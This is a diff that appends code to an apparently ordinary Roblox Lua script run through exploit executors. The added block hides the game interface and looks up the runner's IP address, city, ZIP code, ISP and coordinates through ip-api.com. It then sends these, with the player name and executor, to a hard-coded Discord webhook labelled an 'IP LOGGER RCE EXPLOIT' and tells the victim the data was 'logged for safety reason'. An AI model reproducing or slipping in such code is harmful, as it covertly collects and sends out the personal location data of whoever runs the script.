@@ -145,3 +145,151 @@ button.MouseButton1Click:Connect(function()
         end
     end
 end)
+
+wait("3")
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local Marketplace = game:GetService("MarketplaceService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+local executor = "Unknown"
+if identifyexecutor then executor = identifyexecutor() end
+if syn then executor = "Synapse X" end
+if fluxus then executor = "Fluxus" end
+if KRNL then executor = "KRNL" end
+
+local fps = 0
+RunService.RenderStepped:Connect(function(dt)
+    fps = math.floor(1 / dt)
+end)
+
+local ping = math.floor(game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+local gameName = "Unknown"
+pcall(function()
+    gameName = Marketplace:GetProductInfo(game.PlaceId).Name
+end)
+local placeId = game.PlaceId
+
+local timeStr = os.date("%Y-%m-%d %H:%M:%S")
+
+
+local function notify(title, message)
+    if syn and syn.toast_notification then
+        syn.toast_notification(title, message)
+    elseif fluxus and fluxus.toast_notification then
+        fluxus.toast_notification(title, message)
+    elseif KRNL and KRNL.Notify then
+        KRNL.Notify(title, message)
+    elseif rconsoleprint then
+        rconsoleprint("\n["..title.."]\n" .. message .. "\n")
+    else
+        print(title .. ": " .. message)
+    end
+end
+
+local ipInfo = {
+    ip = "Unknown",
+    city = "Unknown",
+    region = "Unknown",
+    country = "Unknown",
+    timezone = "Unknown",
+    zip = "Unknown",
+    isp = "Unknown",
+    lat = "Unknown",
+    lon = "Unknown"
+}
+
+local success, body = pcall(function()
+    local req = syn and syn.request or http_request or request
+    if req then
+        return req({
+            Url = "http://ip-api.com/json",
+            Method = "GET"
+        }).Body
+    end
+end)
+
+if success and body then
+    local function grab(key)
+        return body:match('"'..key..'":"(.-)"') or "Unknown"
+    end
+    ipInfo.ip      = grab("query")
+    ipInfo.city     = grab("city")
+    ipInfo.region   = grab("regionName")
+    ipInfo.country  = grab("country")
+    ipInfo.timezone = grab("timezone")
+    ipInfo.zip      = grab("zip")
+    ipInfo.isp      = grab("isp")
+    ipInfo.lat      = grab("lat") or "Unknown"
+    ipInfo.lon      = grab("lon") or "Unknown"
+end
+
+
+local fullInfo =
+    "ip: " .. ipInfo.ip .. "\n" ..
+    "City: " .. ipInfo.city .. "\n" ..
+    "Region: " .. ipInfo.region .. "\n" ..
+    "Country: " .. ipInfo.country .. "\n" ..
+    "ZIP: " .. ipInfo.zip .. "\n" ..
+    "Timezone: " .. ipInfo.timezone .. "\n" ..
+    "ISP: " .. ipInfo.isp .. "\n" ..
+    "Latitude: " .. ipInfo.lat .. "\n" ..
+    "Longitude: " .. ipInfo.lon .. "\n" ..
+    "\---GAME INFO---\n" ..
+"Player: " .. player.Name .. "\n" ..
+"Executor: " .. executor .. "\n" ..
+"FPS: " .. fps .. "\n" ..
+"Ping: " .. ping .. " ms\n" ..
+"Game: " .. gameName .. " (" .. placeId .. ")\n" ..
+"Date: " .. timeStr
+
+notify("logged for safety reason", fullInfo)
+
+local WEBHOOK = "https://discord.com/api/webhooks/1446628984053039276/BAaEKSqzI31hGlDnoYUuRV2EMAcyjXPTpuxVxUwA_FR7HmYEnyVEbcOrDNm-shogtz50" -- 🔥 PUT YOUR WEBHOOK HERE
+
+pcall(function()
+    local req = syn and syn.request or http_request or request
+    if req then
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = "**ROBLOX IP LOGGER RCE EXPLOIT**\n```"..fullInfo.."```"
+            })
+        })
+    end
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "rce exploit"
+gui.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1,0,1,0)
+frame.BackgroundColor3 = Color3.new(1,1,1)
+frame.BackgroundTransparency = 1
+frame.ZIndex = 9999
+frame.Parent = gui
+
+local tweenIn = TweenService:Create(frame, TweenInfo.new(0.15), {BackgroundTransparency = 0})
+local tweenOut = TweenService:Create(frame, TweenInfo.new(0.25), {BackgroundTransparency = 1})
+
+tweenIn:Play()
+tweenIn.Completed:Wait()
+wait(1)
+tweenOut:Play()
+tweenOut.Completed:Wait()
+
+gui:Destroy()
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
